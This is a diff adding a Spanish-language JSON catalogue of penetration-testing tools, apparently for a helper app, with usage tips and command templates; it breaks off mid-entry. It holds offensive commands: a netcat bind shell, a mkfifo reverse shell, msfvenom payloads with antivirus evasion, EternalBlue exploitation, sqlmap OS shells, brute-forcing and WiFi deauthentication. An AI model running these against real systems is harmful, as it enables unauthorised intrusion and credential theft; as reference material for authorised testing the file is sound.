@@ -1,0 +1,1706 @@
+{
+  "tools": [
+    {
+      "name": "nmap",
+      "category": "Recon",
+      "level": 1,
+      "tags": [
+        "puertos",
+        "red",
+        "servicios",
+        "reconocimiento",
+        "scan",
+        "versiones"
+      ],
+      "description": "Scanner de red. Descubre hosts activos, puertos abiertos, servicios y versiones. Es la primera herramienta en cualquier engagement.",
+      "when_to_use": "Al inicio de cualquier pentest. Sin saber qué puertos están abiertos no puedes avanzar.",
+      "output_guide": "Busca puertos 'open'. El campo VERSION te dice qué software corre — úsalo en searchsploit. 'filtered' significa firewall.",
+      "chain": [
+        "searchsploit",
+        "nikto",
+        "gobuster",
+        "metasploit"
+      ],
+      "installed": true,
+      "examples": [
+        {
+          "desc": "Scan rápido — 1000 puertos más comunes",
+          "cmd": "nmap -sV -sC {target}",
+          "level": 1
+        },
+        {
+          "desc": "Scan completo — todos los 65535 puertos",
+          "cmd": "nmap -p- -T4 --min-rate 5000 {target}",
+          "level": 1
+        },
+        {
+          "desc": "Detección de OS y versiones (requiere root)",
+          "cmd": "sudo nmap -A {target}",
+          "level": 2
+        },
+        {
+          "desc": "SYN scan silencioso",
+          "cmd": "sudo nmap -sS -T2 {target}",
+          "level": 2
+        },
+        {
+          "desc": "UDP scan — DNS(53), SNMP(161), TFTP(69)",
+          "cmd": "sudo nmap -sU --top-ports 100 {target}",
+          "level": 2
+        },
+        {
+          "desc": "Evadir firewall: fragmentar y spoofear",
+          "cmd": "sudo nmap -sS -f --ttl 64 -D RND:5 {target}",
+          "level": 3
+        }
+      ],
+      "troubleshooting": [
+        "Todos los puertos 'filtered': el host bloquea ICMP. Prueba con -Pn.",
+        "Scan muy lento: añade --min-rate 1000 o sube -T (1-5).",
+        "'open|filtered': firewall con estado. Prueba -sA (ACK scan)."
+      ]
+    },
+    {
+      "name": "netdiscover",
+      "category": "Recon",
+      "level": 1,
+      "tags": [
+        "red local",
+        "arp",
+        "hosts",
+        "lan",
+        "descubrimiento"
+      ],
+      "description": "Descubre hosts activos en la red local usando ARP. Más confiable que nmap en LAN porque ARP no puede ser filtrado por firewalls de host.",
+      "when_to_use": "Antes de nmap, cuando no sabes qué IPs están activas en la red local. Ideal en CTF o lab.",
+      "output_guide": "La tabla muestra IP, MAC, vendor. 'VMware' = VM, 'Cisco' = router/switch.",
+      "chain": [
+        "nmap"
+      ],
+      "installed": true,
+      "examples": [
+        {
+          "desc": "Escanear un rango de red",
+          "cmd": "sudo netdiscover -r 192.168.1.0/24",
+          "level": 1
+        },
+        {
+          "desc": "Modo pasivo — solo escucha ARP sin enviar nada",
+          "cmd": "sudo netdiscover -p -i eth0",
+          "level": 2
+        }
+      ],
+      "troubleshooting": [
+        "Sin resultados: verifica tu interfaz con 'ip a' y que estés en la misma red.",
+        "En modo pasivo tarda más: necesita que los hosts generen tráfico ARP naturalmente."
+      ]
+    },
+    {
+      "name": "whois",
+      "category": "Recon",
+      "level": 1,
+      "tags": [
+        "dominio",
+        "osint",
+        "registro",
+        "dns",
+        "propietario"
+      ],
+      "description": "Consulta el registro público de dominios e IPs. Revela propietario, registrar, fechas y servidores de nombre.",
+      "when_to_use": "Reconocimiento externo pasivo. No genera logs en el target — es información pública.",
+      "output_guide": "Atención a: Name Server (para subdominios), Registrant, Creation Date.",
+      "chain": [
+        "theHarvester",
+        "nmap"
+      ],
+      "installed": true,
+      "examples": [
+        {
+          "desc": "Info completa de un dominio",
+          "cmd": "whois {domain}",
+          "level": 1
+        },
+        {
+          "desc": "Info de una IP (reverse whois)",
+          "cmd": "whois {target}",
+          "level": 1
+        }
+      ],
+      "troubleshooting": [
+        "Output vacío: el registrador ofrece privacidad. Prueba viewdns.info."
+      ]
+    },
+    {
+      "name": "theHarvester",
+      "category": "Recon",
+      "level": 1,
+      "tags": [
+        "osint",
+        "emails",
+        "subdominios",
+        "google",
+        "pasivo",
+        "externo"
+      ],
+      "description": "Recolecta emails, subdominios e IPs de fuentes públicas (Google, Bing, crt.sh). OSINT automatizado sin tocar el objetivo.",
+      "when_to_use": "Reconocimiento externo de un dominio. Encuentra subdominios y emails para expandir la superficie de ataque.",
+      "output_guide": "Subdominios = nuevos vectores. Emails revelan el formato de usuario (nombre.apellido@empresa.com).",
+      "chain": [
+        "nmap",
+        "gobuster"
+      ],
+      "installed": true,
+      "examples": [
+        {
+          "desc": "Buscar con Google",
+          "cmd": "theHarvester -d {domain} -b google -l 500",
+          "level": 1
+        },
+        {
+          "desc": "Múltiples fuentes",
+          "cmd": "theHarvester -d {domain} -b bing,google,crtsh",
+          "level": 2
+        },
+        {
+          "desc": "Guardar en XML",
+          "cmd": "theHarvester -d {domain} -b all -f resultado",
+          "level": 2
+        }
+      ],
+      "troubleshooting": [
+        "Sin resultados con Google: Google bloquea scraping. Prueba -b bing o -b crtsh.",
+        "Error de API: algunas fuentes requieren API key en /etc/theHarvester/api-keys.yaml"
+      ]
+    },
+    {
+      "name": "gobuster",
+      "category": "Web",
+      "level": 1,
+      "tags": [
+        "directorios",
+        "web",
+        "fuerza bruta",
+        "rutas",
+        "subdominios",
+        "wordlist"
+      ],
+      "description": "Fuerza bruta de directorios, archivos y subdominios web. Encuentra rutas ocultas (/admin, /backup, /api) no enlazadas en el sitio.",
+      "when_to_use": "Después de identificar un servidor web. Antes de probar vulnerabilidades necesitas saber qué páginas existen.",
+      "output_guide": "200=existe. 301/302=redirección. 403=existe pero bloqueado (puede bypassearse). 401=requiere auth.",
+      "chain": [
+        "nikto",
+        "burpsuite",
+        "sqlmap",
+        "ffuf"
+      ],
+      "installed": true,
+      "examples": [
+        {
+          "desc": "Enumerar directorios",
+          "cmd": "gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt",
+          "level": 1
+        },
+        {
+          "desc": "Buscar archivos PHP, HTML, TXT",
+          "cmd": "gobuster dir -u http://{target} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt",
+          "level": 1
+        },
+        {
+          "desc": "Enumerar subdominios DNS",
+          "cmd": "gobuster dns -d {domain} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
+          "level": 2
+        },
+        {
+          "desc": "Con cookie de sesión",
+          "cmd": "gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -H 'Cookie: session={hash}'",
+          "level": 2
+        },
+        {
+          "desc": "VHOST fuzzing",
+          "cmd": "gobuster vhost -u http://{target} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain",
+          "level": 3
+        }
+      ],
+      "troubleshooting": [
+        "Muchos falsos positivos: añade -b 404,403 o --exclude-length.",
+        "SecLists no encontrado: sudo apt install seclists",
+        "Muy lento: sube threads con -t 50."
+      ]
+    },
+    {
+      "name": "ffuf",
+      "category": "Web",
+      "level": 2,
+      "tags": [
+        "fuzzing",
+        "web",
+        "directorios",
+        "parametros",
+        "vhost",
+        "rapido"
+      ],
+      "description": "Fuzzer web moderno y rápido. Puede fuzzear cualquier parte HTTP: URL, headers, body, parámetros. Estándar actual en CTF y pentesting web.",
+      "when_to_use": "Cuando necesitas fuzzear parámetros GET/POST o headers. Más potente que gobuster para targets complejos.",
+      "output_guide": "Filtra ruido con -fc (filter code) o -fs (filter size). Si todas las respuestas tienen el mismo tamaño, ese es el 404 — filtralo con -fs.",
+      "chain": [
+        "burpsuite",
+        "sqlmap"
+      ],
+      "installed": true,
+      "examples": [
+        {
+          "desc": "Fuzz de directorios básico",
+          "cmd": "ffuf -u http://{target}/FUZZ -w /usr/share/wordlists/dirb/common.txt",
+          "level": 1
+        },
+        {
+          "desc": "Filtrando 404 y respuestas vacías",
+          "cmd": "ffuf -u http://{target}/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fc 404 -fs 0",
+          "level": 2
+        },
+        {
+          "desc": "Fuzz de parámetro GET",
+          "cmd": "ffuf -u 'http://{target}/page?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt",
+          "level": 2
+        },
+        {
+          "desc": "Fuzz POST",
+          "cmd": "ffuf -u http://{target}/login -X POST -d 'username=admin&password=FUZZ' -w /usr/share/wordlists/rockyou.txt -fc 401",
+          "level": 2
+        },
+        {
+          "desc": "VHOST fuzzing",
+          "cmd": "ffuf -u http://{target} -H 'Host: FUZZ.{domain}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0",
+          "level": 3
+        }
+      ],
+      "troubleshooting": [
+        "Muchos resultados: -fs {tamaño_de_error}",
+        "Rate limiting: baja con -rate 10",
+        "No instalado: sudo apt install ffuf"
+      ]
+    },
+    {
+      "name": "nikto",
+      "category": "Web",
+      "level": 1,
+      "tags": [
+        "vulnerabilidades",
+        "web",
+        "scanner",
+        "configuracion",
+        "cabeceras"
+      ],
+      "description": "Scanner de vulnerabilidades web automático. Detecta versiones desactualizadas, archivos peligrosos (.bak, .old), configuraciones inseguras y CVEs conocidos.",
+      "when_to_use": "Scan inicial rápido de un servidor web. No es silencioso — genera muchos logs. Para visión general.",
+      "output_guide": "Líneas con '+' son hallazgos. OSVDB/CVE numbers son referencias. Cabeceras faltantes son bajo riesgo.",
+      "chain": [
+        "gobuster",
+        "burpsuite",
+        "searchsploit"
+      ],
+      "installed": true,
+      "examples": [
+        {
+          "desc": "Scan básico",
+          "cmd": "nikto -h http://{target}",
+          "level": 1
+        },
+        {
+          "desc": "Scan HTTPS",
+          "cmd": "nikto -h https://{target} -ssl",
+          "level": 1
+        },
+        {
+          "desc": "Guardar en HTML",
+          "cmd": "nikto -h http://{target} -o reporte.html -Format htm",
+          "level": 2
+        },
+        {
+          "desc": "A través de proxy Burp",
+          "cmd": "nikto -h http://{target} -useproxy http://127.0.0.1:8080",
+          "level": 3
+        }
+      ],
+      "troubleshooting": [
+        "Muy lento: usa -Tuning para limitar checks. Ej: -Tuning 1 para solo ficheros interesantes.",
+        "Falsos positivos frecuentes: verifica manualmente los hallazgos importantes."
+      ]
+    },
+    {
+      "name": "sqlmap",
+      "category": "Web",
+      "level": 2,
+      "tags": [
+        "sql",
+        "inyeccion",
+        "base de datos",
+        "web",
+        "automatico",
+        "dump"
+      ],
+      "description": "Automatiza detección y explotación de SQL injection. Puede extraer BDs, tablas, datos, hashes, y en casos conseguir ejecución de comandos.",
+      "when_to_use": "Cuando sospechas SQLi en un parámetro. Confirma manualmente primero (agrega ' y ve si hay error), luego lanza sqlmap.",
+      "output_guide": "Te dirá el tipo de inyección encontrada. Time-based es más lento pero funciona sin output visible.",
+      "chain": [
+        "burpsuite",
+        "john",
+        "hashcat"
+      ],
+      "installed": true,
+      "examples": [
+        {
+          "desc": "Detectar inyección en URL",
+          "cmd": "sqlmap -u 'http://{target}/page?id=1' --batch",
+          "level": 1
+        },
+        {
+          "desc": "Listar bases de datos",
+          "cmd": "sqlmap -u 'http://{target}/page?id=1' --dbs --batch",
+          "level": 1
+        },
+        {
+          "desc": "Listar tablas de una BD",
+          "cmd": "sqlmap -u 'http://{target}/page?id=1' -D {domain} --tables --batch",
+          "level": 2
+        },
+        {
+          "desc": "Dump tabla de usuarios",
+          "cmd": "sqlmap -u 'http://{target}/page?id=1' -D {domain} -T users --dump --batch",
+          "level": 2
+        },
+        {
+          "desc": "Desde request guardada de Burp",
+          "cmd": "sqlmap -r request.txt --batch --level 3 --risk 2",
+          "level": 2
+        },
+        {
+          "desc": "Intentar OS shell",
+          "cmd": "sqlmap -u 'http://{target}/page?id=1' --os-shell --batch",
+          "level": 3
+        }
+      ],
+      "troubleshooting": [
+        "No encuentra inyección: sube --level 5 --risk 3.",
+        "WAF bloqueando: --tamper=space2comment,between,randomcase",
+        "Muy lento (time-based): es normal, la inyección por tiempo requiere esperar el delay."
+      ]
+    },
+    {
+      "name": "burpsuite",
+      "category": "Web",
+      "level": 2,
+      "tags": [
+        "proxy",
+        "http",
+        "intercept",
+        "web",
+        "repeater",
+        "intruder"
+      ],
+      "description": "Proxy interceptor HTTP/S. Permite ver, modificar y repetir cualquier petición web. La herramienta más importante en pentesting web.",
+      "when_to_use": "Siempre que hagas pentesting web. Configura el browser para usar 127.0.0.1:8080 como proxy.",
+      "output_guide": "Repeater: modifica y reenvía peticiones. Intruder: automatiza fuerza bruta. Instala el cert CA para HTTPS.",
+      "chain": [
+        "sqlmap",
+        "ffuf",
+        "nikto"
+      ],
+      "installed": true,
+      "examples": [
+        {
+          "desc": "Iniciar Burp Suite (requiere GUI)",
+          "cmd": "burpsuite &",
+          "level": 1
+        },
+        {
+          "desc": "Configurar Firefox: Ajustes > Red > Proxy Manual",
+          "cmd": "# HTTP: 127.0.0.1 Puerto: 8080",
+          "level": 1
+        },
+        {
+          "desc": "Instalar cert CA: navega a http://burpsuite con proxy activo",
+          "cmd": "# Descarga e instala el certificado en Firefox",
+          "level": 1
+        }
+      ],
+      "troubleshooting": [
+        "No intercepta HTTPS: instala el cert CA de Burp en el navegador.",
+        "Sin GUI: usa mitmproxy como alternativa desde terminal."
+      ]
+    },
+    {
+      "name": "wfuzz",
+      "category": "Web",
+      "level": 2,
+      "tags": [
+        "fuzzing",
+        "web",
+        "parametros",
+        "cookies",
+        "headers",
+        "wordlist"
+      ],
+      "description": "Fuzzer web versátil. Puede fuzzear cualquier componente HTTP con control fino del output.",
+      "when_to_use": "Cuando necesitas fuzzear múltiples posiciones simultáneamente o parámetros específicos.",
+      "output_guide": "Filtra con --hc (hide code) o --hh (hide lines). El resultado que difiere del resto es el interesante.",
+      "chain": [
+        "burpsuite",
+        "sqlmap"
+      ],
+      "installed": true,
+      "examples": [
+        {
+          "desc": "Fuzz de directorios ocultando 404",
+          "cmd": "wfuzz -c --hc 404 -w /usr/share/wordlists/dirb/common.txt http://{target}/FUZZ",
+          "level": 1
+        },
+        {
+          "desc": "Fuzz de parámetro GET",
+          "cmd": "wfuzz -c --hc 404 -w /usr/share/wordlists/dirb/common.txt 'http://{target}/page?id=FUZZ'",
+          "level": 2
+        },
+        {
+          "desc": "Fuzz de dos parámetros simultáneos",
+          "cmd": "wfuzz -c --hc 404 -w users.txt -w passwords.txt 'http://{target}/login?user=FUZZ&pass=FUZ2Z'",
+          "level": 3
+        }
+      ],
+      "troubleshooting": [
+        "Demasiado ruido: usa --hh o --hl para filtrar respuestas del mismo tamaño.",
+        "Lento: sube threads con -t 20."
+      ]
+    },
+    {
+      "name": "metasploit",
+      "category": "Exploitation",
+      "level": 2,
+      "tags": [
+        "exploit",
+        "payload",
+        "framework",
+        "shell",
+        "reverse",
+        "meterpreter"
+      ],
+      "description": "Framework de explotación más completo. Miles de exploits, payloads (Meterpreter), auxiliares y post-explotación. Se usa desde msfconsole.",
+      "when_to_use": "Cuando identificaste un servicio vulnerable (nmap + searchsploit) y quieres explotarlo. También para generar payloads con msfvenom.",
+      "output_guide": "Sesión abierta = acceso al sistema. 'sessions -l' lista sesiones. 'sessions -i 1' entra a la sesión 1.",
+      "chain": [
+        "searchsploit",
+        "nmap",
+        "linpeas",
+        "winpeas"
+      ],
+      "installed": true,
+      "examples": [
+        {
+          "desc": "Iniciar consola",
+          "cmd": "msfconsole -q",
+          "level": 1
+        },
+        {
+          "desc": "Buscar exploits EternalBlue",
+          "cmd": "search type:exploit ms17-010",
+          "level": 1
+        },
+        {
+          "desc": "Usar EternalBlue",
+          "cmd": "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target}; set LHOST {target}; run",
+          "level": 2
+        },
+        {
+          "desc": "Generar payload reverse shell",
+          "cmd": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={target} LPORT=4444 -f elf -o shell.elf",
+          "level": 2
+        },
+        {
+          "desc": "Listener para recibir reverse shell",
+          "cmd": "use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST {target}; set LPORT 4444; run",
+          "level": 2
+        },
+        {
+          "desc": "Post-explotación: sugerir escaladas",
+          "cmd": "use post/multi/recon/local_exploit_suggester; set SESSION 1; run",
+          "level": 3
+        }
+      ],
+      "troubleshooting": [
+        "No session created: LHOST es TU IP, no la del target.",
+        "PostgreSQL no inicia: systemctl start postgresql antes de msfconsole.",
+        "Payload bloqueado por AV: usa encoder con msfvenom -e x86/shikata_ga_nai -i 5"
+      ]
+    },
+    {
+      "name": "searchsploit",
+      "category": "Exploitation",
+      "level": 1,
+      "tags": [
+        "exploits",
+        "cve",
+        "offline",
+        "exploit-db",
+        "busqueda",
+        "vulnerabilidades"
+      ],
+      "description": "Búsqueda offline en Exploit-DB. Encuentra exploits públicos para servicios y versiones específicas sin internet.",
+      "when_to_use": "Después de nmap. Toma el output de versiones (Apache 2.2.3, OpenSSH 7.2p2) y busca exploits públicos.",
+      "output_guide": "El número al final es el ID en exploit-db.com. Copia con -m. Lee el exploit antes de ejecutarlo.",
+      "chain": [
+        "nmap",
+        "metasploit"
+      ],
+      "installed": true,
+      "examples": [
+        {
+          "desc": "Buscar exploits para Apache 2.4",
+          "cmd": "searchsploit apache 2.4",
+          "level": 1
+        },
+        {
+          "desc": "Buscar con términos exactos",
+          "cmd": "searchsploit --exact 'WordPress 5.0'",
+          "level": 1
+        },
+        {
+          "desc": "Copiar exploit al directorio actual",
+          "cmd": "searchsploit -m 42315",
+          "level": 1
+        },
+        {
+          "desc": "Ver exploit sin copiarlo",
+          "cmd": "searchsploit -x 42315",
+          "level": 2
+        },
+        {
+          "desc": "Actualizar la BD de exploits",
+          "cmd": "searchsploit -u",
+          "level": 2
+        }
+      ],
+      "troubleshooting": [
+        "Muchos resultados: sé más específico. 'apache 2.4.49' en lugar de 'apache'.",
+        "BD desactualizada: searchsploit -u para sincronizar."
+      ]
+    },
+    {
+      "name": "hydra",
+      "category": "Passwords",
+      "level": 1,
+      "tags": [
+        "fuerza bruta",
+        "credenciales",
+        "ssh",
+        "ftp",
+        "http",
+        "login",
+        "wordlist"
+      ],
+      "description": "Fuerza bruta de credenciales para más de 50 protocolos: SSH, FTP, HTTP, SMB, RDP. Muy rápido gracias al paralelismo.",
+      "when_to_use": "Cuando encontraste un servicio con login y tienes listas de usuarios/contraseñas. Verifica si hay lockout antes.",
+      "output_guide": "Línea verde con 'login: X password: Y' = credencial válida. Muchas respuestas fallidas = posible bloqueo.",
+      "chain": [
+        "nmap",
+        "netcat",
+        "metasploit"
+      ],
+      "installed": true,
+      "examples": [
+        {
+          "desc": "Fuerza bruta SSH con usuario conocido",
+          "cmd": "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://{target}",
+          "level": 1
+        },
+        {
+          "desc": "Con lista de usuarios y contraseñas",
+          "cmd": "hydra -L usuarios.txt -P /usr/share/wordlists/rockyou.txt ftp://{target}",
+          "level": 1
+        },
+        {
+          "desc": "HTTP POST form",
+          "cmd": "hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} http-post-form '/login:username=^USER^&password=^PASS^:F=Invalid'",
+          "level": 2
+        },
+        {
+          "desc": "SSH con verbose",
+          "cmd": "hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 -V ssh://{target}",
+          "level": 2
+        },
+        {
+          "desc": "Password spray (evita lockout)",
+          "cmd": "hydra -L usuarios.txt -p 'Password123!' ssh://{target} -t 1 -W 3",
+          "level": 3
+        }
+      ],
+      "troubleshooting": [
+        "Muy lento en SSH: máximo -t 4. Más threads = más bloqueos.",
+        "HTTP POST no funciona: 'F=Invalid' debe coincidir exactamente con el texto de error.",
+        "IP bloqueada: usa -W para añadir delay."
+      ]
+    },
+    {
+      "name": "john",
+      "category": "Passwords",
+      "level": 1,
+      "tags": [
+        "hash",
+        "cracking",
+        "offline",
+        "contraseñas",
+        "shadow",
+        "wordlist"
+      ],
+      "description": "John the Ripper. Crackea hashes offline: MD5, SHA1, bcrypt, NTLM, /etc/shadow. Detecta automáticamente el tipo de hash.",
+      "when_to_use": "Cuando tienes hashes de una BD, /etc/shadow, o volcado SAM de Windows. Crackeo offline, sin tráfico al target.",
+      "output_guide": "Hash crackeado aparece junto al hash. Usa --show para ver todos. Los hashes bcrypt son muy lentos — usa hashcat con GPU.",
+      "chain": [
+        "hashcat",
+        "metasploit"
+      ],
+      "installed": true,
+      "examples": [
+        {
+          "desc": "Crackear con wordlist",
+          "cmd": "john {hash} --wordlist=/usr/share/wordlists/rockyou.txt",
+          "level": 1
+        },
+        {
+          "desc": "Ver contraseñas crackeadas",
+          "cmd": "john --show {hash}",
+          "level": 1
+        },
+        {
+          "desc": "Crackear /etc/shadow",
+          "cmd": "unshadow /etc/passwd /etc/shadow > combined.txt && john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt",
+          "level": 2
+        },
+        {
+          "desc": "Forzar tipo de hash",
+          "cmd": "john {hash} --format=NT --wordlist=/usr/share/wordlists/rockyou.txt",
+          "level": 2
+        },
+        {
+          "desc": "Ataque de reglas (variaciones)",
+          "cmd": "john {hash} --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64",
+          "level": 3
+        }
+      ],
+      "troubleshooting": [
+        "Hash no identificado: usa hash-identifier primero.",
+        "Ya crackeado: john guarda resultados. Usa --show.",
+        "Muy lento en bcrypt: usa hashcat con GPU."
+      ]
+    },
+    {
+      "name": "hashcat",
+      "category": "Passwords",
+      "level": 2,
+      "tags": [
+        "hash",
+        "gpu",
+        "cracking",
+        "rapido",
+        "ntlm",
+        "wordlist",
+        "reglas"
+      ],
+      "description": "Cracker de hashes con GPU. Órdenes de magnitud más rápido que John. Soporta más de 300 tipos de hash.",
+      "when_to_use": "Cuando tienes hashes que john no puede crackear en tiempo razonable. Requiere GPU para máximo rendimiento.",
+      "output_guide": "Hash crackeado aparece como 'hash:contraseña'. Tipos comunes: MD5=0, NTLM=1000, SHA256=1400, bcrypt=3200.",
+      "chain": [
+        "john",
+        "metasploit"
+      ],
+      "installed": true,
+      "examples": [
+        {
+          "desc": "Crackear MD5",
+          "cmd": "hashcat -m 0 {hash} /usr/share/wordlists/rockyou.txt",
+          "level": 1
+        },
+        {
+          "desc": "Crackear NTLM (Windows)",
+          "cmd": "hashcat -m 1000 {hash} /usr/share/wordlists/rockyou.txt",
+          "level": 1
+        },
+        {
+          "desc": "Con reglas (variaciones automáticas)",
+          "cmd": "hashcat -m 0 {hash} /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
+          "level": 2
+        },
+        {
+          "desc": "Ataque por máscara: 4 letras + 4 números",
+          "cmd": "hashcat -m 0 -a 3 {hash} ?l?l?l?l?d?d?d?d",
+          "level": 3
+        },
+        {
+          "desc": "Ver tipos de hash",
+          "cmd": "hashcat --help | grep -i sha256",
+          "level": 1
+        }
+      ],
+      "troubleshooting": [
+        "Sin GPU en VM/contenedor: usa --force para CPU (más lento).",
+        "Device not found: instala drivers de GPU o usa hashcat en el host."
+      ]
+    },
+    {
+      "name": "aircrack-ng",
+      "category": "Wireless",
+      "level": 2,
+      "tags": [
+        "wifi",
+        "wpa",
+        "wep",
+        "handshake",
+        "wireless",
+        "monitor"
+      ],
+      "description": "Suite completa para auditoría WiFi. Captura handshake WPA/WPA2 y lo crackea. Requiere tarjeta con modo monitor.",
+      "when_to_use": "Auditoría de redes WiFi con autorización. En VMs necesitas adaptador USB WiFi pasado al contenedor.",
+      "output_guide": "El handshake capturado es el .cap. Aircrack prueba la PSK contra el handshake con el diccionario.",
+      "chain": [
+        "hashcat"
+      ],
+      "installed": true,
+      "examples": [
+        {
+          "desc": "Paso 1: modo monitor",
+          "cmd": "sudo airmon-ng start wlan0",
+          "level": 1
+        },
+        {
+          "desc": "Paso 2: listar redes",
+          "cmd": "sudo airodump-ng wlan0mon",
+          "level": 1
+        },
+        {
+          "desc": "Paso 3: capturar handshake",
+          "cmd": "sudo airodump-ng -c {canal} --bssid {MAC_AP} -w captura wlan0mon",
+          "level": 2
+        },
+        {
+          "desc": "Paso 4: forzar desautenticación",
+          "cmd": "sudo aireplay-ng --deauth 10 -a {MAC_AP} wlan0mon",
+          "level": 2
+        },
+        {
+          "desc": "Paso 5: crackear handshake",
+          "cmd": "aircrack-ng captura.cap -w /usr/share/wordlists/rockyou.txt",
+          "level": 1
+        }
+      ],
+      "troubleshooting": [
+        "No captura handshake: usa aireplay-ng --deauth para forzarlo.",
+        "Tarjeta sin modo monitor: necesitas chipset Atheros, Ralink o similar.",
+        "En VM: necesitas adaptador USB WiFi pasado directamente."
+      ]
+    },
+    {
+      "name": "wireshark",
+      "category": "Network",
+      "level": 1,
+      "tags": [
+        "trafico",
+        "paquetes",
+        "captura",
+        "analisis",
+        "protocolo",
+        "red"
+      ],
+      "description": "Analizador de tráfico de red con GUI. Captura y disecciona paquetes en tiempo real con filtros potentes.",
+      "when_to_use": "Para analizar capturas .pcap (muy común en CTF), ver tráfico en tiempo real, o encontrar credenciales en texto plano.",
+      "output_guide": "Usa filtros de display. En CTF busca HTTP, FTP, SMTP. Credenciales en texto plano aparecen en el panel de datos.",
+      "chain": [
+        "tcpdump",
+        "netcat"
+      ],
+      "installed": true,
+      "examples": [
+        {
+          "desc": "Iniciar con GUI",
+          "cmd": "wireshark &",
+          "level": 1
+        },
+        {
+          "desc": "Capturar desde terminal (tshark)",
+          "cmd": "tshark -i eth0 -w captura.pcap",
+          "level": 1
+        },
+        {
+          "desc": "Filtrar HTTP en pcap",
+          "cmd": "tshark -r captura.pcap -Y 'http' -V",
+          "level": 2
+        },
+        {
+          "desc": "Extraer credenciales FTP",
+          "cmd": "tshark -r captura.pcap -Y 'ftp' -T fields -e ftp.request.arg",
+          "level": 2
+        }
+      ],
+      "troubleshooting": [
+        "No captura sin root: sudo usermod -aG wireshark $USER",
+        "Sin GUI: usa tshark que viene incluido."
+      ]
+    },
+    {
+      "name": "tcpdump",
+      "category": "Network",
+      "level": 1,
+      "tags": [
+        "captura",
+        "trafico",
+        "red",
+        "cli",
+        "filtros",
+        "pcap"
+      ],
+      "description": "Captura y analiza tráfico desde terminal. Más ligero que Wireshark, ideal para servidores sin GUI.",
+      "when_to_use": "En servidores o contenedores sin GUI. Para capturar tráfico mientras ejecutas otras herramientas.",
+      "output_guide": "Cada línea es un paquete con timestamp, IPs y flags TCP. Con -A ves contenido ASCII — útil para credenciales en claro.",
+      "chain": [
+        "wireshark"
+      ],
+      "installed": true,
+      "examples": [
+        {
+          "desc": "Capturar en eth0",
+          "cmd": "sudo tcpdump -i eth0",
+          "level": 1
+        },
+        {
+          "desc": "Guardar a pcap",
+          "cmd": "sudo tcpdump -i eth0 -w captura.pcap",
+          "level": 1
+        },
+        {
+          "desc": "Filtrar por host",
+          "cmd": "sudo tcpdump -i eth0 host {target}",
+          "level": 1
+        },
+        {
+          "desc": "Ver tráfico HTTP en ASCII",
+          "cmd": "sudo tcpdump -i eth0 -A 'tcp port 80'",
+          "level": 2
+        }
+      ],
+      "troubleshooting": [
+        "Permiso denegado: necesitas sudo o grupo pcap.",
+        "Interfaz incorrecta: lista con 'ip a' o usa -i any."
+      ]
+    },
+    {
+      "name": "netcat",
+      "category": "Network",
+      "level": 1,
+      "tags": [
+        "shell",
+        "reverse",
+        "conexion",
+        "tcp",
+        "transferencia",
+        "listener",
+        "bind"
+      ],
+      "description": "Navaja suiza de TCP/IP. Crea conexiones TCP/UDP, transfiere archivos, recibe reverse shells. Herramienta fundamental.",
+      "when_to_use": "Siempre que necesites recibir una reverse shell, transferir archivos a/desde un target, o probar conectividad.",
+      "output_guide": "Al recibir reverse shell verás el prompt del sistema remoto. No hay prompt explícito — escribe comandos directamente.",
+      "chain": [
+        "metasploit",
+        "hydra"
+      ],
+      "installed": true,
+      "examples": [
+        {
+          "desc": "Escuchar para recibir reverse shell",
+          "cmd": "nc -lvnp 4444",
+          "level": 1
+        },
+        {
+          "desc": "Conectar a host:puerto",
+          "cmd": "nc {target} 80",
+          "level": 1
+        },
+        {
+          "desc": "Transferir archivo — receptor",
+          "cmd": "nc -lvnp 4444 > archivo.txt",
+          "level": 2
+        },
+        {
+          "desc": "Transferir archivo — emisor",
+          "cmd": "nc {target} 4444 < archivo.txt",
+          "level": 2
+        },
+        {
+          "desc": "Shell bind",
+          "cmd": "nc -lvnp 4444 -e /bin/bash",
+          "level": 2
+        }
+      ],
+      "troubleshooting": [
+        "Shell inestable: mejora con 'python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\"'",
+        "nc sin -e: usa mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc {target} 4444 >/tmp/f"
+      ]
+    },
+    {
+      "name": "enum4linux",
+      "category": "Network",
+      "level": 2,
+      "tags": [
+        "windows",
+        "samba",
+        "smb",
+        "usuarios",
+        "shares",
+        "active directory"
+      ],
+      "description": "Enumera info de Windows y Samba: usuarios, grupos, shares, políticas de contraseñas. Esencial en redes con Windows.",
+      "when_to_use": "Cuando nmap encuentra puertos 139/445 (SMB) abiertos. Enumera antes de intentar credenciales.",
+      "output_guide": "Busca: lista de usuarios (para fuerza bruta), shares sin autenticación, y políticas de contraseñas.",
+      "chain": [
+        "hydra",
+        "metasploit",
+        "responder"
+      ],
+      "installed": true,
+      "examples": [
+        {
+          "desc": "Enumeración completa (null session)",
+          "cmd": "enum4linux -a {target}",
+          "level": 1
+        },
+        {
+          "desc": "Solo usuarios",
+          "cmd": "enum4linux -U {target}",
+          "level": 1
+        },
+        {
+          "desc": "Solo shares",
+          "cmd": "enum4linux -S {target}",
+          "level": 1
+        },
+        {
+          "desc": "Con credenciales",
+          "cmd": "enum4linux -u admin -p {hash} -a {target}",
+          "level": 2
+        }
+      ],
+      "troubleshooting": [
+        "Sin resultados: el servidor requiere auth. Prueba enum4linux-ng.",
+        "Alternativa moderna: netexec smb {target} --users"
+      ]
+    },
+    {
+      "name": "responder",
+      "category": "Network",
+      "level": 3,
+      "tags": [
+        "ntlm",
+        "llmnr",
